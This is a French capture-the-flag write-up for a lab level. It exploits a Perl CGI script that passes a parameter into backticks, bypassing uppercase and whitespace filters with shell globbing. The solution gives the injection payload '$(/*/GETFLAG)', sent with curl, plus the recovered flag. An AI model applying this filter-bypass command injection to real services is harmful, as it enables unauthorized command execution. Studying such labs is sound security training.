# Level 12

## 📋 Informations

- **Domaine** : Command Injection (Perl / Shell Expansion)
- **Objectif** : Contourner des filtres regex stricts (majuscules, espaces) pour injecter une commande via un script CGI Perl.

---

## 🔍 Exploration

Nous trouvons un script Perl `level12.pl` qui semble tourner en tant que serveur CGI sur le port 4646.

```perl title:level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

---

## 🛠️ Analyse

La vulnérabilité se situe à cette ligne :
```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```
Perl utilise des backticks pour exécuter `egrep` dans un shell. La variable `$xx` vient directement du paramètre `x`.

Cependant, il existe deux filtres gênants appliqués à `$xx` avant l'exécution :
1.  `$xx =~ tr/a-z/A-Z/;` : Tout caractère minuscule est converti en majuscule. (ex: `ls` devient `LS`, `/bin/sh` devient `/BIN/SH`).
2.  `$xx =~ s/\s.*//;` : Tout ce qui suit le premier espace est supprimé.

> [!IMPORTANT]
> **La stratégie**
> Pour injecter une commande, nous ne pouvons pas écrire de chemins standards (comme `/bin/getflag` ou `/tmp/exploit`) car ils contiennent des minuscules qui seront brisées par le `tr`.
>
> **La solution : Shell Globbing (Wildcards)**
> Le shell développe les wildcards `*` avant d'exécuter la commande.
> L'expression `/*` peut correspondre à `/tmp` (entre autres).
> Si nous créons un script avec un nom EN MAJUSCULES dans `/tmp` (ex: `/tmp/EXPLOIT`), nous pouvons l'appeler via `/*/EXPLOIT`.

---

## 🔓 Résolution

### 1. Création du Payload
Nous devons créer un script qui exécute `getflag`. Comme nous ne voyons pas le retour, nous redirigeons la sortie.
Le nom du fichier doit être en **MAJUSCULES** pour que nous puissions l'invoquer sans être altéré par le filtre `tr` (car `TR` ne change rien aux majuscules).

```bash
echo "getflag > /tmp/flag" > /tmp/GETFLAG
chmod +x /tmp/GETFLAG
```

### 2. Exécution via Curl
Nous utilisons `curl` pour appeler le script CGI localement.
Nous utilisons la syntaxe `$()` (command substitution) qui est interprétée par le shell appelé par Perl.

URL cible : `localhost:4646/?x=$(/*/GETFLAG)`

Le chemin `/*/GETFLAG` sera transformé par le shell en `/tmp/GETFLAG` (car `/tmp` match `/*`).

```bash
curl 'localhost:4646/?x=$(/*/GETFLAG)'
```

> [!NOTE]
> Notez l'utilisation des quotes simples pour que votre shell local n'interprète pas le `$()` avant de l'envoyer à curl.

### 3. Résultat
Vérifions le fichier de sortie.

```bash
cat /tmp/flag
```

**Flag Final :**
```text
g1qKMiRpXf53AWhDaU7FEkczr
```

---

## 📚 Notions utiles

- **Perl Backticks** : Exécution de commandes shell (similaire à `system` ou `shell_exec` en PHP).
- **Globbing / Wildcards** : Utilisation de `*` pour référencer des fichiers sans connaître leur chemin exact ou pour contourner des filtres de caractères.
- **Bypass de filtres** : Utiliser les mécanismes du shell pour reconstruire des chaînes interdites (majuscules/minuscules).